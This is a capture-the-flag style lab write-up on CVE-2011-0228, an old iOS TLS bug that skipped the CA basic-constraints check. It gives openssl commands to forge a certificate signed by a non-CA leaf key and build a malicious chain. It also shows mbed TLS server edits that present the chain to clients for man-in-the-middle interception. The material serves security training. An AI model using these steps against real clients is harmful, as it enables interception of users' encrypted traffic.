# CVE-2011-0228

### x509 verification and chain of trust

As part of a request sent over TLS, before sending the request, the client will make sure that:

* The certificate is valid.
* The certificate matches the hostname it's visiting.

Validating a certificate's validity can be divided into multiple steps:

* Ensuring the current certificate did not expired and is valid for the current time (the issue date is not in the future)..
* Ensuring that the current certificate is signed by a valid certificate authority (CA).
* Ensuring that the parent certificate is a certificate authority.

These checks are performed for all certificates in the certificate chain to established a chain of trust. The first certificate (root CA) is embedded in your browser/system and is already trusted. If all certificates in the chain can be validated, the leaf certificate (last certificate in the chain) can be trusted.

### Vulnerability

CVE-2011-0228 impacted iOS before 4.2.10 and 4.3.x before 4.3.5. This  issue is located in the last step of the verification: "ensuring that  the parent certificate is a certificate authority". TLS stack impacted  by CVE-2011-0228 did not verify that constraint. This allows an attacker to generate a malicious "valid" certificate for example.org using a  valid certificate even if he is not a certificate authority. 

### Generating Malicious certificate

* To start, you will need a valid certificate and its private key. You can get one [here](https://pentesterlab.com/exercises/mitm_IV/attachments).

* If you inspect the certificate, you can see that it's not a certificate authority as **CA:FALSE**:

  ```bash
  $ openssl x509 -in hackingwithpentesterlab.link.crt -text
  [...]
          X509v3 extensions:
  [...]
              X509v3 Basic Constraints: critical
                  CA:FALSE
  [...]
  ```

  NOTE : **However, nothing prevents you from creating your own certificate and  signing it with the private key. TLS clients (unless they are vulnerable to CVE-2011-0228) will just reject this certificate as one of your  certificates is not a certificate authority.**

* you can create a private key using:

  ```bash
  $ openssl genrsa -out mitm4.pentesterlab.com.key 2048
  ```

* and a certificate signing request (CSR) for your future certificate:

  ```bash
  $ openssl req -new -sha256 -key mitm4.pentesterlab.com.key -out mitm4.pentesterlab.com.csr
  You are about to be asked to enter information that will be incorporated
  into your certificate request.
  What you are about to enter is what is called a Distinguished Name or a DN.
  There are quite a few fields but you can leave some blank
  For some fields there will be a default value,
  If you enter '.', the field will be left blank.
  -----
  Country Name (2 letter code) [AU]:AU
  State or Province Name (full name) [Some-State]:Victoria
  Locality Name (eg, city) []:Melbourne
  Organization Name (eg, company) [Internet Widgits Pty Ltd]:PentesterLab
  Organizational Unit Name (eg, section) []:
  Common Name (e.g. server FQDN or YOUR name) []:mitm4.pentesterlab.com
  Email Address []:
  
  Please enter the following 'extra' attributes
  to be sent with your certificate request
  A challenge password []:
  An optional company name []:
  ```

  **You don't need to setup a password and you can set any values for these fields aside from the `Common Name (e.g. server FQDN or YOUR name)` that needs to perfectly match the hostname accessed by the vulnerable client.**

* To get from the CSR to a certificate, you will need to setup some files and directory to get `openssl` to work:

  ```bash
  % mkdir -p demoCA/private demoCA/newcerts
  % cp hackingwithpentesterlab.link.key demoCA/private/cakey.pem
  % cp hackingwithpentesterlab.link.crt demoCA/cacert.pem
  % touch demoCA/index.txt
  % echo 01 > demoCA/serial
  ```

* You can sign the CSR with the `hackingwithpentesterlab.link.key` 's  key and openssl configuration file:

  ```bash
  % openssl ca   -config openssl.cnf -verbose  -out mitm4.pentesterlab.com.crt -infiles mitm4.pentesterlab.com.csr
  [...]
  Certificate is to be certified until Feb  2 21:20:52 2017 GMT (365 days)
  Sign the certificate? [y/n]:y
  
  
  1 out of 1 certificate requests certified, commit? [y/n]y
  Write out database with 1 new entries
  writing new certificates
  writing ./demoCA/newcerts/01.pem
  Data Base Updated
  ```

  openssl will automatically take cacert.pem file from `demoCA/cacert.pem` and cakey.pem from `demoCA/private/cakey.pem` for signing the certificate.

  

  Now, you will just need to concatenate the certificates to create your malicious chain (`myca.pem`).

### Making Chain of trusts

* So, **GandiStandardSSLCA2.pem** (Parent CA) should be the CA for `hackingwithpentesterlab.link.crt` and for `mitm4.pentesterlab.com.crt` too.

* But the system doesn't verify that for `mitm4.pentesterlab.com.crt`  the CA **GandiStandardSSLCA2.pem** is must.

* So. now we will MADE: **GandiStandardSSLCA2.pem** as CA for `hackingwithpentesterlab.link.crt` 

  and **hackingwithpentesterlab.link.crt** as CA for `mitm4.pentesterlab.com.crt`

  now we make a file `myca.pem` which make this chain of trust in one file.

  ```bash
  $ cat mitm4.pentesterlab.com.crt hackingwithpentesterlab.link.crt GandiStandardSSLCA2.pem > myca.pem
  ```

### Setting Up malicious server

* Unfortunately, OpenSSL is a bit too smart on this and will not present an invalid chain.

* So, we'll use **mbed TLS**

  mbed TLS comes with some code examples. We can use `programs/ssl/ssl_server.c` and modify it to get what we want.

  First, let's make sure it compiles (on Debian):

  ```bash
  $ wget https://tls.mbed.org/download/mbedtls-2.2.1-apache.tgz
  $ tar -zxf mbedtls-2.2.1-apache.tgz
  $ cd mbedtls-2.2.1
  $ apt-get update && apt-get upgrade #hygiene
  $ apt-get install build-essential
  $ make
  ```

* Now that it's compiled we can start modifying the file `programs/ssl/ssl_server.c` to change the following:

  - Load the certificates' chain from a file.
  - Load the private key from a file.

* To load the certificate chain from a file, you just need to change (around line 134):

  ```c
  ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt, mbedtls_test_srv_crt_len );
  ```

  by:

  ```c
  ret =  mbedtls_x509_crt_parse_file(&srvcert, "/root/myca.pem");
  ```

  To load the key from a file, you just need to change (around line 150):

  ```c
  ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key, mbedtls_test_srv_key_len, NULL, 0 );
  ```

  by:

  ```c
  ret =  mbedtls_pk_parse_keyfile(&pkey, "/root/mitm4.pentesterlab.com.key",NULL);
  ```

* Finally, you just need to change the port used by the server from `4433` to `443`. The port is set when the code calls the function `mbedtls_net_bind`. 

* Once you performed both modification, you need to recompile the code:

  ```bash
  $ make
  ```

* You should now be able to present your malicious chain to legitimate clients by running the server:

  ```bash
  $ ./programs/ssl/ssl_server
  ```

